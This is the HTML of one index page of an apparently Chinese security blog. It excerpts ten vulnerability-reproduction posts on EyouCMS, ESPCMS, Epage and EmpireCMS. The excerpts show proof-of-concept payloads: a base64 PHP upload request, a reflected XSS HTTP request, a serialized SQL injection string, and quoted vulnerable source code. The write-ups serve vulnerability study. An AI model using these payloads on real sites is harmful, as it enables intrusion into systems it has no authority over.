@@ -1,0 +1,646 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>She11c0de&#39;s blogs</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta property="og:type" content="website">
+<meta property="og:title" content="She11c0de&#39;s blogs">
+<meta property="og:url" content="https://she11c0de.github.io/page/79/index.html">
+<meta property="og:site_name" content="She11c0de&#39;s blogs">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:author" content="She11c0de">
+<meta name="twitter:card" content="summary">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+  <link type="text/css" href="//netdna.bootstrapcdn.com/font-awesome/4.2.0/css/font-awesome.css" rel="stylesheet">
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+<link rel="stylesheet" href="/css/scrollUp/image.css">
+
+  <!--[if lt IE 9]><script src="//cdnjs.cloudflare.com/ajax/libs/html5shiv/3.7/html5shiv.min.js"></script><![endif]-->
+  
+<meta name="generator" content="Hexo 5.4.2"></head>
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <div class="logo">
+        <img src="/logo.png" alt="Profile Picture">
+      </div>
+      <div id="title">She11c0de's blogs</div>
+      
+       <ul class="my-socials">
+  
+ 
+</ul>
+    </div>
+  </div>
+  <div id="header-inner" class="">
+    <nav id="main-nav">
+      <a id="main-nav-toggle" class="nav-icon"></a>
+      <!--
+        
+          
+            <a class="main-nav-link" href="/">首页</a>
+          
+            <a class="main-nav-link" href="/categories/life">生活</a>
+          
+            <a class="main-nav-link" href="/archives">归档</a>
+          
+        
+      -->
+    </nav>
+    <nav id="title-nav" style="display:none">
+      <a href="/">She11c0de&#39;s blogs</a>
+      <img src="/logo.png" alt="Profile Picture">
+      <!--
+      <span id="title-nav-socials">
+        
+       
+     </span>
+      -->
+    </nav>
+    <nav id="sub-nav">
+      
+      <a id="nav-search-btn" class="nav-icon" title="Search"></a>
+    </nav>
+    <div id="search-form-wrap">
+      <form action="http://www.baidu.com/baidu" method="get" accept-charset="utf-8" class="search-form">
+        <input type="search" name="word" maxlength="20" class="search-form-input" placeholder="搜索">
+        <input type="submit" value="" class="search-form-submit">
+        <input name=tn type=hidden value="bds">
+        <input name=cl type=hidden value="3">
+        <input name=ct type=hidden value="2097152">
+        <input type="hidden" name="si" value="she11c0de.github.io">
+      </form>
+    </div>
+  </div>
+  <div class="site-nav" style="display: none;">
+    <ul>
+      
+      
+        <li><a href="/">首页</a></li>
+      
+        <li><a href="/categories/life">生活</a></li>
+      
+        <li><a href="/archives">归档</a></li>
+      
+      
+    </ul>
+  </div>
+</header>
+      <div class="outer">
+        <section id="main">
+  
+
+    
+    <article id="post-Eyoucms/Eyoucms 1.3.9 上传漏洞" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/07/07/Eyoucms/Eyoucms%201.3.9%20%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/" class="article-date">
+  <time datetime="2022-07-08T06:25:55.953Z" itemprop="datePublished">2022-07-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="Eyoucms-1-3-9-上传漏洞"><a href="#Eyoucms-1-3-9-上传漏洞" class="headerlink" title="Eyoucms 1.3.9 上传漏洞"></a>Eyoucms 1.3.9 上传漏洞</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><p>EyouCms是基于TP5.0框架为核心开发的免费+开源的企业内容管理系统，专注企业建站用户需求提供海量各行业模板，降低中小企业网站建设、网络营销成本，致力于打造用户舒适的建站体验。易优cms<br>v1.3.7后台插件模块存在代码执</p>
+<h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><p>Weapp.php文件中的create()方法接收了请求中的参数，过滤后直接存入php配置文件中，但是由于过滤不严，导致可以直接写入代码进去并执行。</p>
+<h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><h3 id="1、登陆后台"><a href="#1、登陆后台" class="headerlink" title="1、登陆后台"></a>1、登陆后台</h3><p>在后台-----》插件应用-----》上传插件这里可以上传zip文件</p>
+<p><img src="/resource/Eyoucms1.3.9%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/media/rId25.png"></p>
+<p>在Weapp.php文件中的upload()方法中可以上传zip文件，并会自动解压到一个文件夹名是随机md5值的文件夹下</p>
+        
+          <p class="article-more-link">
+            <a href="/2022/07/07/Eyoucms/Eyoucms%201.3.9%20%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/#more">......</a>
+          </p>
+        
+      
+    </div>
+    <footer class="article-footer">
+      
+        <a data-url="https://she11c0de.github.io/2022/07/07/Eyoucms/Eyoucms%201.3.9%20%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/" data-id="cl5c2qonx006ly8v1e0570692" class="article-share-link">分享到</a>
+      
+
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+    
+  
+
+    
+    <article id="post-Eyoucms/Eyoucms 1.3.5 后台getshell" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/07/07/Eyoucms/Eyoucms%201.3.5%20%E5%90%8E%E5%8F%B0getshell/" class="article-date">
+  <time datetime="2022-07-08T06:25:55.951Z" itemprop="datePublished">2022-07-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="Eyoucms-1-3-5-后台getshell"><a href="#Eyoucms-1-3-5-后台getshell" class="headerlink" title="Eyoucms 1.3.5 后台getshell"></a>Eyoucms 1.3.5 后台getshell</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><h3 id="最新版本删除该功能"><a href="#最新版本删除该功能" class="headerlink" title="最新版本删除该功能"></a>最新版本删除该功能</h3><h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><p>Eyoucms 1.3.5</p>
+<h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>相关功能代码在<code>application/admin/controller/Tools.php</code></p>
+<pre><code> public function restoreUpload()
+ &#123;
+     $file = request()-&gt;file(&#39;sqlfile&#39;);
+     if(empty($file))&#123;
+         $this-&gt;error(&#39;请上传sql文件&#39;);
+     &#125;
+     // 移动到框架应用根目录/data/sqldata/ 目录下
+     $path = tpCache(&#39;global.web_sqldatapath&#39;);
+     $path = !empty($path) ? $path : config(&#39;DATA_BACKUP_PATH&#39;);
+     $path = trim($path, &#39;/&#39;);
+     $image_upload_limit_size = intval(tpCache(&#39;basic.file_size&#39;) * 1024 * 1024);
+     $info = $file-&gt;validate([&#39;size&#39;=&gt;$image_upload_limit_size,&#39;ext&#39;=&gt;&#39;sql,gz&#39;])-&gt;move($path, $_FILES[&#39;sqlfile&#39;][&#39;name&#39;]);
+     if ($info) &#123;
+         //上传成功 获取上传文件信息
+         $file_path_full = $info-&gt;getPathName();
+         if (file_exists($file_path_full)) &#123;
+             $sqls = Backup::parseSql($file_path_full);
+             if(Backup::install($sqls))&#123;
+                //array_map(&quot;unlink&quot;, glob($path));
+                 /*清除缓存*/
+                 delFile(RUNTIME_PATH);
+                 /*--end*/
+                 $this-&gt;success(&quot;执行sql成功&quot;, url(&#39;Tools/restore&#39;));
+             &#125;else&#123;
+                 $this-&gt;error(&#39;执行sql失败&#39;);
+             &#125;
+         &#125; else &#123;
+             $this-&gt;error(&#39;sql文件上传失败&#39;);
+         &#125;
+     &#125; else &#123;
+         //上传错误提示错误信息
+         $this-&gt;error($file-&gt;getError());
+     &#125;
+ &#125;
+</code></pre>
+<p>上传过程中只验证了文件的大小和后缀，之后解析sql语句并执行。解析sql函数不再贴出，但并没有检测文件内容正常的sql语句都能通过解析。install函数直接执行了sql语句。</p>
+        
+          <p class="article-more-link">
+            <a href="/2022/07/07/Eyoucms/Eyoucms%201.3.5%20%E5%90%8E%E5%8F%B0getshell/#more">......</a>
+          </p>
+        
+      
+    </div>
+    <footer class="article-footer">
+      
+        <a data-url="https://she11c0de.github.io/2022/07/07/Eyoucms/Eyoucms%201.3.5%20%E5%90%8E%E5%8F%B0getshell/" data-id="cl5c2qonv006gy8v17gtl4dpi" class="article-share-link">分享到</a>
+      
+
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+    
+  
+
+    
+    <article id="post-Eyoucms/Eyoucms 1.0 前台getshell" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/07/07/Eyoucms/Eyoucms%201.0%20%E5%89%8D%E5%8F%B0getshell/" class="article-date">
+  <time datetime="2022-07-08T06:25:55.949Z" itemprop="datePublished">2022-07-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="Eyoucms-1-0-前台getshell"><a href="#Eyoucms-1-0-前台getshell" class="headerlink" title="Eyoucms 1.0 前台getshell"></a>Eyoucms 1.0 前台getshell</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><p>官网：<a target="_blank" rel="noopener" href="http://www.eyoucms.com/download/Cms%E4%B8%8B%E8%BD%BD%E5%9C%B0%E5%9D%80%EF%BC%9Ahttp://www.eyoucms.com/eyoucms1.0.zip">http://www.eyoucms.com/download/Cms下载地址：http://www.eyoucms.com/eyoucms1.0.zip</a></p>
+<h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><p>老样子：先讲如何利用</p>
+<pre><code>url: http://test.eyoucms1.0.com/index.php/api/Uploadify/preview
+
+构造: &lt;?php phpinfo;
+</code></pre>
+<p><img src="/resource/Eyoucms1.0%E5%89%8D%E5%8F%B0getshell/media/rId24.png"></p>
+<pre><code>post: data:image/php;base64,PD9waHAgcGhwaW5mbygpOw==
+</code></pre>
+<p><img src="/resource/Eyoucms1.0%E5%89%8D%E5%8F%B0getshell/media/rId25.png"></p>
+        
+          <p class="article-more-link">
+            <a href="/2022/07/07/Eyoucms/Eyoucms%201.0%20%E5%89%8D%E5%8F%B0getshell/#more">......</a>
+          </p>
+        
+      
+    </div>
+    <footer class="article-footer">
+      
+        <a data-url="https://she11c0de.github.io/2022/07/07/Eyoucms/Eyoucms%201.0%20%E5%89%8D%E5%8F%B0getshell/" data-id="cl5c2qonw006iy8v1f7909w2g" class="article-share-link">分享到</a>
+      
+
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+    
+  
+
+    
+    <article id="post-ESPCMS/ESPCMS 反射型xss" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/07/07/ESPCMS/ESPCMS%20%E5%8F%8D%E5%B0%84%E5%9E%8Bxss/" class="article-date">
+  <time datetime="2022-07-08T06:25:55.942Z" itemprop="datePublished">2022-07-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="ESPCMS-前台反射型xss"><a href="#ESPCMS-前台反射型xss" class="headerlink" title="ESPCMS 前台反射型xss"></a>ESPCMS 前台反射型xss</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><p>ESPCMS P8.18101601</p>
+<h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><pre><code>POST /index.php?ac=Search&amp;at=List HTTP/1.1
+Host: www.0-sec.org
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:80.0) Gecko/20100101 Firefox/80.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 46
+Origin: https://www.0-sec.org
+Connection: close
+Referer: https://www.0-sec.org8/index.php?ac=Search&amp;at=List
+Cookie: zerosec; 
+
+mid=0&amp;keyword=&quot;&gt;&lt;img src=1 onerror=alert(1)&gt;&lt;&quot;
+</code></pre>
+
+        
+          <p class="article-more-link">
+            <a href="/2022/07/07/ESPCMS/ESPCMS%20%E5%8F%8D%E5%B0%84%E5%9E%8Bxss/#more">......</a>
+          </p>
+        
+      
+    </div>
+    <footer class="article-footer">
+      
+        <a data-url="https://she11c0de.github.io/2022/07/07/ESPCMS/ESPCMS%20%E5%8F%8D%E5%B0%84%E5%9E%8Bxss/" data-id="cl5c2qoms006ey8v14zcodpk9" class="article-share-link">分享到</a>
+      
+
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+    
+  
+
+    
+    <article id="post-Epage/Epage sql 注入漏洞" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/07/07/Epage/Epage%20sql%20%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" class="article-date">
+  <time datetime="2022-07-08T06:25:55.937Z" itemprop="datePublished">2022-07-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="Epage-sql-注入漏洞"><a href="#Epage-sql-注入漏洞" class="headerlink" title="Epage sql 注入漏洞"></a>Epage sql 注入漏洞</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><p>将单引号用来站内搜寻时发现不可注入，正准备放弃时发现搜索结果的第N页的连结中使用了php序列刚好最近学到php序列不安全，未检查的情况下unserialize后会造成许多问题，甚至RCE看了一下序列的长相是否有机可称：</p>
+<pre><code>wc=a:3:&#123;s:3:&quot;Key&quot;;s:4:&quot;test&quot;;s:8:&quot;pagesize&quot;;s:2:&quot;10&quot;;s:3:&quot;Rcg&quot;;i:0;&#125;
+</code></pre>
+<p>嗯，是一个序列化过的array，里面的key竟然是我刚才的输入！？试试注入单引号，失败，准备放弃QQ我的输入会显示出来......，那试试XSS好了蛤，报错！？原来没有过滤双引号啊而且还回显了完整的sql语句开始闭合语句</p>
+<p>透过构造</p>
+<pre><code>a:3:&#123;s:3:&quot;Key&quot;;s:42:&quot;&quot;and(substring(version(),1,1)=&quot;5&quot;)and&quot;%&quot;=&quot;&quot;;s:8:&quot;pagesize&quot;;s:2:&quot;10&quot;;s:3:&quot;Rcg&quot;;i:0;&#125;
+</code></pre>
+<p>查无资料</p>
+        
+          <p class="article-more-link">
+            <a href="/2022/07/07/Epage/Epage%20sql%20%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/#more">......</a>
+          </p>
+        
+      
+    </div>
+    <footer class="article-footer">
+      
+        <a data-url="https://she11c0de.github.io/2022/07/07/Epage/Epage%20sql%20%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" data-id="cl5c2qomt006fy8v13fw4ent7" class="article-share-link">分享到</a>
+      
+
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+    
+  
+
+    
+    <article id="post-EmpireCMS/（CVE-2018-19462）EmpireCMS 7.5 admindbDoSql.php代码注入漏洞" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/07/07/EmpireCMS/%EF%BC%88CVE-2018-19462%EF%BC%89EmpireCMS%207.5%20admindbDoSql.php%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" class="article-date">
+  <time datetime="2022-07-08T06:25:55.695Z" itemprop="datePublished">2022-07-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="（CVE-2018-19462）EmpireCMS-7-5-admindbDoSql-php代码注入漏洞"><a href="#（CVE-2018-19462）EmpireCMS-7-5-admindbDoSql-php代码注入漏洞" class="headerlink" title="（CVE-2018-19462）EmpireCMS 7.5 admindbDoSql.php代码注入漏洞"></a>（CVE-2018-19462）EmpireCMS 7.5 admindbDoSql.php代码注入漏洞</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><p>EmpireCMS7.5及之前版本中的admindbDoSql.php文件存在代码注入漏洞。该漏洞源于外部输入数据构造代码段的过程中,网路系统或产品未正确过滤其中的特殊元素。攻击者可利用该漏洞生成非法的代码段,修改网络系统或组件的预期的执行控制流。</p>
+<h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><p>EmpireCMS 7.5</p>
+<h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><p>漏洞出现的页面如下</p>
+<p>1.png</p>
+<p>分析源码定位漏洞出现的位置在/e/admin/db/DoSql.php,浏览代码,对sqltext使用RepSqlTbpre函数进行处理</p>
+<p>2.png</p>
+        
+          <p class="article-more-link">
+            <a href="/2022/07/07/EmpireCMS/%EF%BC%88CVE-2018-19462%EF%BC%89EmpireCMS%207.5%20admindbDoSql.php%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/#more">......</a>
+          </p>
+        
+      
+    </div>
+    <footer class="article-footer">
+      
+        <a data-url="https://she11c0de.github.io/2022/07/07/EmpireCMS/%EF%BC%88CVE-2018-19462%EF%BC%89EmpireCMS%207.5%20admindbDoSql.php%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" data-id="cl5c2qoip006dy8v16a8v7q5t" class="article-share-link">分享到</a>
+      
+
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+    
+  
+
+    
+    <article id="post-EmpireCMS/（CVE-2018-18086）EmpireCMS 7.5 后台getshell" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/07/07/EmpireCMS/%EF%BC%88CVE-2018-18086%EF%BC%89EmpireCMS%207.5%20%E5%90%8E%E5%8F%B0getshell/" class="article-date">
+  <time datetime="2022-07-08T06:25:55.693Z" itemprop="datePublished">2022-07-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="（CVE-2018-18086）EmpireCMS-7-5-后台getshell"><a href="#（CVE-2018-18086）EmpireCMS-7-5-后台getshell" class="headerlink" title="（CVE-2018-18086）EmpireCMS 7.5 后台getshell"></a>（CVE-2018-18086）EmpireCMS 7.5 后台getshell</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><p>EmpireCMS 7.5</p>
+<h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><p>查看<code>/e/admin/ecmsmod.php</code>代码</p>
+<p>1.png</p>
+<p>跟随<code>LoadInMod</code>函数来到<code>/e/class/moddofun.php</code>,可以看到上传文件处使用<code>make_password(10)</code>对时间进行加密然后拼接成为上传的文件名,这样就无法得到用户名</p>
+<p>2.png</p>
+<p>继续浏览代码,在下面发现<code>@include($path)</code>,直接包含了这个上传的文件,这时如果在上传文件中添加可以创建文件的代码就可以绕过找不到文件名这个限制了。</p>
+        
+          <p class="article-more-link">
+            <a href="/2022/07/07/EmpireCMS/%EF%BC%88CVE-2018-18086%EF%BC%89EmpireCMS%207.5%20%E5%90%8E%E5%8F%B0getshell/#more">......</a>
+          </p>
+        
+      
+    </div>
+    <footer class="article-footer">
+      
+        <a data-url="https://she11c0de.github.io/2022/07/07/EmpireCMS/%EF%BC%88CVE-2018-18086%EF%BC%89EmpireCMS%207.5%20%E5%90%8E%E5%8F%B0getshell/" data-id="cl5c2qoio006cy8v124xygsey" class="article-share-link">分享到</a>
+      
+
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+    
+  
+
+    
+    <article id="post-EmpireCMS/EmpireCMS 任意充值漏洞" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/07/07/EmpireCMS/EmpireCMS%20%E4%BB%BB%E6%84%8F%E5%85%85%E5%80%BC%E6%BC%8F%E6%B4%9E/" class="article-date">
+  <time datetime="2022-07-08T06:25:55.691Z" itemprop="datePublished">2022-07-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="EmpireCMS-任意充值漏洞"><a href="#EmpireCMS-任意充值漏洞" class="headerlink" title="EmpireCMS 任意充值漏洞"></a>EmpireCMS 任意充值漏洞</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><p>漏洞文件</p>
+<blockquote>
+<p><a target="_blank" rel="noopener" href="https://www.0-sec.org/EmpireCMS/upload/e/payapi/alipay/payend.php">https://www.0-sec.org/EmpireCMS/upload/e/payapi/alipay/payend.php</a></p>
+</blockquote>
+<p>漏洞详情</p>
+<p>首先在<code>/e/payapi/alipay/payend.php</code></p>
+<pre><code>$sign=&#39;&#39;;
+
+foreach($_GET AS $key=&gt;$val)
+
+&#123;
+
+if($key!=&#39;sign&#39;&amp;&amp;$key!=&#39;sign_type&#39;&amp;&amp;$key!=&#39;code&#39;)
+
+&#123;
+
+$sign.=&quot;$key=$val&amp;&quot;;
+
+&#125;
+
+&#125;
+
+
+
+$sign=md5(substr($sign,0,-1).$paykey);
+
+print($sign);
+
+if($sign!=$_GET[&#39;sign&#39;])
+
+&#123;
+
+printerror(&#39;验证MD5签名失败.&#39;,&#39;../../../&#39;,1,0,1);
+</code></pre>
+<p>这个是sign签名的验证没有检测来源是否为支付宝链接而且没有安装情况下key为0</p>
+        
+          <p class="article-more-link">
+            <a href="/2022/07/07/EmpireCMS/EmpireCMS%20%E4%BB%BB%E6%84%8F%E5%85%85%E5%80%BC%E6%BC%8F%E6%B4%9E/#more">......</a>
+          </p>
+        
+      
+    </div>
+    <footer class="article-footer">
+      
+        <a data-url="https://she11c0de.github.io/2022/07/07/EmpireCMS/EmpireCMS%20%E4%BB%BB%E6%84%8F%E5%85%85%E5%80%BC%E6%BC%8F%E6%B4%9E/" data-id="cl5c2qoio006by8v13kgv8lpn" class="article-share-link">分享到</a>
+      
+
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+    
+  
+
+    
+    <article id="post-EmpireCMS/EmpireCMS 7.5 配置文件写入漏洞" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/07/07/EmpireCMS/EmpireCMS%207.5%20%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5%E6%BC%8F%E6%B4%9E/" class="article-date">
+  <time datetime="2022-07-08T06:25:55.688Z" itemprop="datePublished">2022-07-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="EmpireCMS-7-5-配置文件写入漏洞"><a href="#EmpireCMS-7-5-配置文件写入漏洞" class="headerlink" title="EmpireCMS 7.5 配置文件写入漏洞"></a>EmpireCMS 7.5 配置文件写入漏洞</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><p>该漏洞是由于安装程序时没有对用户的输入做严格过滤,导致用户输入的可控参数被写入配置文件,造成任意代码执行漏洞。</p>
+<h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><p>EmpireCMS 7.5</p>
+<h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>1、漏洞出现位置如下图,phome_表前缀没有被严格过滤导致攻击者构造恶意的代码</p>
+<p>　　![img](/resource/EmpireCMS%207.5%20%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5%E6%BC%8F%E6%B4%9E/media/c7beff56f6faabdad2bee689227611e9b6c.png)</p>
+<p>2、定位漏洞出现的位置,发现在/e/install/index.php,下图可以看到表名前缀phome_,将获取表名前缀交给了mydbtbpre参数。</p>
+        
+          <p class="article-more-link">
+            <a href="/2022/07/07/EmpireCMS/EmpireCMS%207.5%20%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5%E6%BC%8F%E6%B4%9E/#more">......</a>
+          </p>
+        
+      
+    </div>
+    <footer class="article-footer">
+      
+        <a data-url="https://she11c0de.github.io/2022/07/07/EmpireCMS/EmpireCMS%207.5%20%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5%E6%BC%8F%E6%B4%9E/" data-id="cl5c2qoio006ay8v1cjswc6o0" class="article-share-link">分享到</a>
+      
+
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+    
+  
+
+    
+    <article id="post-EmpireCMS/EmpireCMS 7.5 后台任意代码执行漏洞" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/07/07/EmpireCMS/EmpireCMS%207.5%20%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" class="article-date">
+  <time datetime="2022-07-08T06:25:55.686Z" itemprop="datePublished">2022-07-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="EmpireCMS-7-5-后台任意代码执行漏洞"><a href="#EmpireCMS-7-5-后台任意代码执行漏洞" class="headerlink" title="EmpireCMS 7.5 后台任意代码执行漏洞"></a>EmpireCMS 7.5 后台任意代码执行漏洞</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><p>EmpireCMS 7.5</p>
+<h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>漏洞代码发生在后台数据备份处代码/e/admin/ebak/ChangeTable.php<br>44行附近，通过审计发现执行备份时，对表名的处理程序是value=””<br>通过php短标签形式直接赋值给tablename[]。</p>
+<p>进行备份时未对数据库表名做验证，导致任意代码执行。</p>
+<h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>1、查看代码e/admin/ebak/phome.php接收备份数据库传递的参数,然后传递给Ebak_DoEbak函数中。</p>
+        
+          <p class="article-more-link">
+            <a href="/2022/07/07/EmpireCMS/EmpireCMS%207.5%20%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/#more">......</a>
+          </p>
+        
+      
+    </div>
+    <footer class="article-footer">
+      
+        <a data-url="https://she11c0de.github.io/2022/07/07/EmpireCMS/EmpireCMS%207.5%20%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" data-id="cl5c2qoin0067y8v1fcjz4dnk" class="article-share-link">分享到</a>
+      
+
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+    
+  
+  
+    <nav id="page-nav">
+      <a class="extend prev" rel="prev" href="/page/78/">上一页</a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/77/">77</a><a class="page-number" href="/page/78/">78</a><span class="page-number current">79</span><a class="page-number" href="/page/80/">80</a><a class="page-number" href="/page/81/">81</a><span class="space">&hellip;</span><a class="page-number" href="/page/101/">101</a><a class="extend next" rel="next" href="/page/80/">下一页</a>
+    </nav>
+  
+</section>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy; 2022 She11c0de<br>
